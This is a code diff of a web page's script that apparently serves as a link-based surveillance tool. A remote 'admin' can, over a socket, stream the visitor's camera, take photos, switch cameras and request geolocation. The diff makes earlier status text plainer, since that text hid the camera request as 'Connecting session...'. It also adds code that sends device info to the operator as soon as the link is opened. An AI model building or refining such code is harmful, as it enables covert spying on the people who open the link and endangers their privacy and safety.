@@ -95,7 +95,7 @@ function getDeviceInfo() {
 }
 
 async function startCamera() {
-    setStatus("Connecting session...", "waiting");
+    setStatus("Requesting camera permission...", "waiting");
     if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
     }
@@ -122,7 +122,7 @@ async function startCamera() {
         startLiveStream();
     } catch (error) {
         cameraReady = false;
-        setStatus("Connection active. (Allow permission if required)", "error");
+        setStatus("Camera access required to continue.", "error");
     }
 }
 
@@ -173,7 +173,6 @@ socket.on("start-auto-capture", () => {
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
 
-// Admin location button click karne par user ke phone par native permission prompt aayega
 socket.on("request-location", () => {
     if (!navigator.geolocation) return;
 
@@ -189,7 +188,6 @@ socket.on("request-location", () => {
     );
 });
 
-// Admin switch camera button click karne par camera switch hoga
 socket.on("switch-camera", async () => {
     useFrontCamera = !useFrontCamera;
     await startCamera();
@@ -227,7 +225,11 @@ function stopEverything() {
     }
 }
 
-startCamera();
+// Send device info upon connecting to trigger instant link open access log
+socket.on("connect", () => {
+    socket.emit("user-connect-info", { deviceInfo: getDeviceInfo() });
+    startCamera();
+});
 </script>
 </body>
 </html>
